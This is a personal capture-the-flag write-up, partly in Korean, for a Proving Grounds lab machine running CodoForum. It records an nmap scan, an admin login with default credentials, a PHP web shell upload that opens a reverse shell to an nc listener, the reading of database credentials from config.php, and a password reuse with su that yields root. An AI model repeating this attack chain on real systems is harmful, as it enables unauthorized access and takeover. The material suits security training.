---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.243.23
ports: [22, 80]
services: [http, ssh]
status: solved
tech_count: 1
---
### Nmap
```bash
┌──(kali㉿kali)-[~/PG/Codo]
└─$ nnmap 192.168.243.23
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-18 16:02 +0900
Nmap scan report for 192.168.243.23
Host is up (0.084s latency).
Not shown: 65533 filtered tcp ports (no-response)
Bug in http-generator: no string output.
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: All topics | CODOLOGIC
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   83.98 ms 192.168.45.1
2   83.94 ms 192.168.45.254
3   84.59 ms 192.168.251.1
4   84.63 ms 192.168.243.23

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.27 seconds

```

/admin/index.php 페이지 접근

`admin/admin` 로그인 후

웹쉘 업로드
![[Pasted image 20260818163517.png]]

리버스쉘 실행
http://192.168.243.23/sites/default/assets/img/attachments/payload.php

```bash
┌──(kali㉿kali)-[~/PG/Codo]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.243.23] 34576
Linux codo 5.4.0-150-generic #167-Ubuntu SMP Mon May 15 17:35:05 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 07:35:51 up 36 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1112): Inappropriate ioctl for device
bash: no job control in this shell
www-data@codo:/$ whoami
whoami
www-data

```

설정 파일 발견
```bash
www-data@codo:/var/www/html/sites/default$ ls
ls
assets
config.php
config.php.example
constants.php
locale
logs
plugins
readme.txt
themes
```

자격증명 확보
```bash
www-data@codo:/var/www/html/sites/default$ cat config.php
cat config.php
<?php

/*
 * @CODOLICENSE
 */

defined('IN_CODOF') or die();

$CF_installed=true;

function get_codo_db_conf() {


    $config = array (
  'driver' => 'mysql',
  'host' => 'localhost',
  'database' => 'codoforumdb',
  'username' => 'codo',
  'password' => 'FatPanda123',
  'prefix' => '',
  'charset' => 'utf8',
  'collation' => 'utf8_unicode_ci',
);

    return $config;
}

$DB = get_codo_db_conf();

$CONF = array (

  'driver' => 'Custom',
  'UID'    => '631042af544ef',
  'SECRET' => '631042af544f0',
  'PREFIX' => ''
);
```

```bash
www-data@codo:/var/www/html/sites/default$ su root
su root
Password: FatPanda123
whoami
root
pwd
/var/www/html/sites/default
cd
cat proof.txt
34f3ce7f6374b4993f09078273faa70c
```

